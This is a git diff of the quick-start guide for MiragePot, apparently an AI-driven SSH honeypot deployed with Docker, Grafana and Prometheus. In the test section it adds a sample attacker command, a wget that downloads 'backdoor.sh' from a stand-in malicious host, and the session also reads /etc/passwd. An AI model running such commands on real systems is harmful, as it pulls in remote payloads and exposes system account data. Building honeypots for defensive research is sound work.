@@ -7,7 +7,7 @@ Get MiragePot running in under 5 minutes with Docker.
 - **Docker** 20.10+ ([Install Docker](https://docs.docker.com/get-docker/))
 - **Docker Compose** v2.0+ (included with Docker Desktop)
 - **5GB free disk space** (for Ollama models)
-- **4GB RAM minimum** (8GB recommended)
+- **4GB RAM minimum** (8GB recommended for full stack)
 
 Verify installation:
 ```bash
@@ -15,68 +15,41 @@ docker --version
 docker compose version
 ```
 
-## Quick Deploy
+## Quick Deploy (Full Stack - Recommended)
 
-### Option 1: One-Command Deploy (Recommended)
+The full stack gives you complete monitoring capabilities with Grafana dashboards, Prometheus metrics, and alerting - perfect for demos and production use.
 
 ```bash
 # Clone the repository
-git clone https://github.com/yourusername/MiragePot.git
+git clone https://github.com/evinbrijesh/MiragePot.git
 cd MiragePot
 
-# Run the deployment script
-./scripts/deploy.sh
-```
-
-The script will:
-1. Check prerequisites
-2. Set up configuration
-3. Pull/build Docker images
-4. Start all services
-5. Download the AI model (~2GB)
-6. Display access URLs
-
-### Option 2: Manual Docker Compose
-
-**Simple Stack** (Honeypot + AI only):
-```bash
 # Copy environment file
 cp .env.docker.example .env.docker
 
-# Start services
-docker compose -f docker-compose-simple.yml up -d
-
-# Pull the AI model (wait ~2-3 minutes)
-docker exec miragepot-ollama-simple ollama pull phi3
-```
-
-**Full Stack** (+ Prometheus, Grafana, Alertmanager):
-```bash
-# Copy environment file
-cp .env.docker.example .env.docker
-
-# Start services
+# Deploy full stack (5 containers)
 cd docker/
 docker compose up -d
 
-# Pull the AI model
+# Download AI model (~2GB, takes 2-5 minutes)
 docker exec miragepot-ollama ollama pull phi3
 ```
 
-## Access Your Honeypot
+**That's it!** Your honeypot is now running.
 
-Once deployed, access these services:
+## Access Your Honeypot
 
 | Service | URL | Credentials |
 |---------|-----|-------------|
 | **SSH Honeypot** | `ssh root@localhost -p 2222` | Any password works |
 | **Streamlit Dashboard** | http://localhost:8501 | None |
-| **Grafana** (full stack) | http://localhost:3000 | admin / admin |
-| **Prometheus** (full stack) | http://localhost:9091 | None |
+| **Grafana Dashboards** | http://localhost:3000 | admin / admin |
+| **Prometheus** | http://localhost:9091 | None |
+| **Alertmanager** | http://localhost:9093 | None |
 
 ## Test the Honeypot
 
-Open a terminal and connect to the honeypot:
+Open a terminal and connect as an "attacker":
 
 ```bash
 ssh root@localhost -p 2222
@@ -91,24 +64,23 @@ pwd
 ls -la
 cat /etc/passwd
 uname -a
+wget http://malicious.com/backdoor.sh  # AI generates fake output
 ```
 
-The AI will generate realistic responses. Watch the Streamlit dashboard to see your session being logged in real-time.
+The AI generates realistic responses. Watch the Streamlit dashboard (http://localhost:8501) to see your session being logged in real-time.
 
 ## View Your Data
 
-### Streamlit Dashboard
-Open http://localhost:8501 to see:
+### Streamlit Dashboard (http://localhost:8501)
 - Live session activity
-- Command history
-- Threat analysis
-- Attacker statistics
+- Command history with threat scores
+- Real-time statistics
 
-### Grafana Dashboards (Full Stack)
-Open http://localhost:3000 and import dashboards from `grafana/dashboards/`:
-- **MiragePot Overview** - Connections, commands, threats
-- **TTP Analysis** - MITRE ATT&CK detections
-- **Performance** - LLM latency, cache efficiency
+### Grafana Dashboards (http://localhost:3000)
+Three pre-built dashboards are automatically provisioned:
+- **MiragePot Overview** - Connections, commands, threat summary
+- **TTP Analysis** - MITRE ATT&CK technique detection
+- **Performance** - LLM latency, cache hit rate
 
 ### Session Logs
 JSON logs are saved to `data/logs/`:
@@ -120,36 +92,39 @@ cat data/logs/session_*.json | jq .
 ## Common Commands
 
 ```bash
-# View container status
-./scripts/deploy.sh --status
+# Check container status
+docker compose ps
 
 # View logs
-./scripts/deploy.sh --logs
+docker compose logs -f
 
 # Stop everything
-./scripts/deploy.sh --stop
+docker compose down
 
 # Restart services
-./scripts/deploy.sh --restart
+docker compose restart
+
+# View honeypot logs only
+docker logs -f miragepot-honeypot
 ```
 
-## Deployment Options Comparison
+## Offline Deployment (No Internet)
 
-| Feature | Simple Stack | Full Stack |
-|---------|--------------|------------|
-| SSH Honeypot | ✅ | ✅ |
-| AI Responses (Ollama) | ✅ | ✅ |
-| Streamlit Dashboard | ✅ | ✅ |
-| Session Logging | ✅ | ✅ |
-| Prometheus Metrics | ✅ (endpoint only) | ✅ (full UI) |
-| Grafana Dashboards | ❌ | ✅ |
-| Alertmanager | ❌ | ✅ |
-| Containers | 2 | 5 |
-| RAM Usage | ~2GB | ~4GB |
+For demos at venues with poor/no internet, create an offline bundle:
 
-**Choose Simple Stack if:** You want quick testing or demos.
+```bash
+# On machine WITH internet (one-time preparation)
+./scripts/export-offline.sh
+# Creates: miragepot-offline-bundle.tar.gz (~6-7GB)
 
-**Choose Full Stack if:** You want full monitoring, alerting, and analysis capabilities.
+# Copy to USB drive, then on demo machine:
+tar xzf miragepot-offline-bundle.tar.gz
+cd MiragePot/
+docker load -i miragepot-images.tar
+# ... follow docs/OFFLINE_DEPLOYMENT.md for full instructions
+```
+
+See [Offline Deployment Guide](OFFLINE_DEPLOYMENT.md) for complete instructions.
 
 ## Troubleshooting
 
@@ -158,7 +133,7 @@ cat data/logs/session_*.json | jq .
 # Start Docker service
 sudo systemctl start docker
 
-# Or on macOS, start Docker Desktop
+# Or on macOS/Windows, start Docker Desktop
 ```
 
 ### "Port 2222 already in use"
@@ -166,47 +141,68 @@ sudo systemctl start docker
 # Find what's using the port
 sudo lsof -i :2222
 
-# Change port in docker-compose file or kill the process
+# Kill the process or change port in docker-compose.yml
 ```
 
 ### "Ollama model not responding"
 ```bash
 # Check if model is downloaded
-docker exec miragepot-ollama-simple ollama list
+docker exec miragepot-ollama ollama list
 
-# Re-pull the model
-docker exec miragepot-ollama-simple ollama pull phi3
+# Re-pull the model if needed
+docker exec miragepot-ollama ollama pull phi3
 ```
 
-### "Services not starting"
+### "Containers not starting"
 ```bash
 # Check container logs
-docker compose -f docker-compose-simple.yml logs
+docker compose logs
 
 # Check specific container
-docker logs miragepot-honeypot-simple
+docker logs miragepot-honeypot
 ```
 
-### Low disk space warning
-The phi3 model requires ~2GB. Free up space or use a smaller model:
+### "Grafana shows no data"
 ```bash
-# Edit .env.docker and change:
-MIRAGEPOT_LLM_MODEL=phi3:mini  # Smaller variant
+# Check if Prometheus is scraping metrics
+curl http://localhost:9091/api/v1/targets
+
+# Wait 15-30 seconds for first scrape, then refresh Grafana
+```
+
+## Stop Everything
+
+```bash
+cd docker/
+docker compose down
+
+# To also remove volumes (deletes all data):
+docker compose down -v
 ```
 
 ## Next Steps
 
-- Read the full [Docker Deployment Guide](DOCKER_DEPLOYMENT.md)
-- Learn about [Monitoring & Dashboards](MONITORING.md)
-- Understand the [Architecture](architecture.md)
-- Configure [Alerts & Notifications](CONFIGURATION.md)
+- **Presenting to others?** See [Demo Walkthrough](DEMO_WALKTHROUGH.md)
+- **No internet at venue?** See [Offline Deployment](OFFLINE_DEPLOYMENT.md)
+- **Configure alerts?** See [Monitoring Guide](MONITORING.md)
+- **Customize settings?** See [Configuration Reference](CONFIGURATION.md)
+- **Understand internals?** See [Architecture](architecture.md)
 
-## Getting Help
+## Advanced: Simple Stack (Minimal Deployment)
 
-- Check existing [documentation](.)
-- Open an issue on GitHub
-- Review logs: `./scripts/deploy.sh --logs`
+If you have limited resources or just want quick local testing without monitoring:
+
+```bash
+# From project root (not docker/ folder)
+cp .env.docker.example .env.docker
+docker compose -f docker-compose-simple.yml up -d
+docker exec miragepot-ollama-simple ollama pull phi3
+```
+
+This deploys only 2 containers (Honeypot + Ollama) without Prometheus/Grafana/Alertmanager.
+
+**Note:** For demos and production, use the Full Stack deployment above for complete visibility into honeypot activity.
 
 ---
 
-**Congratulations!** You now have an AI-powered SSH honeypot running. Watch attackers interact with your fake server while the AI generates convincing responses!
+**Congratulations!** You now have an AI-powered SSH honeypot with full monitoring. Watch attackers interact with your fake server while the AI generates convincing responses!
